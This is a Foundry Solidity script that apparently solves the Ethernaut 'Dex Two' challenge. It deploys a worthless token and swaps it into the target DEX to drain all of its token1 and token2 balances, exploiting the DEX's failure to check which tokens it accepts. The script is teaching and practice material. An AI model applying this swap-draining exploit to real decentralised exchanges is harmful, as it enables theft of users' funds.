// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
// import "../src/DexTwoAttack.sol"; // 1) add file
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IDexTwo { // 1) change interface name

    function swap(address from, address to, uint256 amount) external;
    function token1() view external returns (address);
    function token2() view external returns (address);
}

contract AttackToken is ERC20 {
    constructor() ERC20("AttackToken", "ATK") {
        _mint(msg.sender, 1000);
    }
}

contract SolveDexTwo is Script { // 2) change contractName

    function run() external {

        address _target = 0xF299Fd65fBD42c523f492C5EF547EDf392C75648; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        IDexTwo target = IDexTwo(_target);
        address token1Addr = target.token1();
        ERC20 token1 = ERC20(token1Addr);
        address token2Addr = target.token2();
        ERC20 token2 = ERC20(token2Addr);

        vm.startBroadcast(privateKey);

        AttackToken attoken = new AttackToken();
        attoken.transfer(address(target), 1);
        attoken.approve(address(target), 1000);
        target.swap(address(attoken), target.token1(), 1);
        target.swap(address(attoken), target.token2(), 2);


        uint256 balance1 = token1.balanceOf(address(target));
        console.log("Balance token1 du Dex:", balance1);

        uint256 balance2 = token2.balanceOf(address(target));
        console.log("Balance token2 du Dex:", balance2);

        vm.stopBroadcast();

    }
}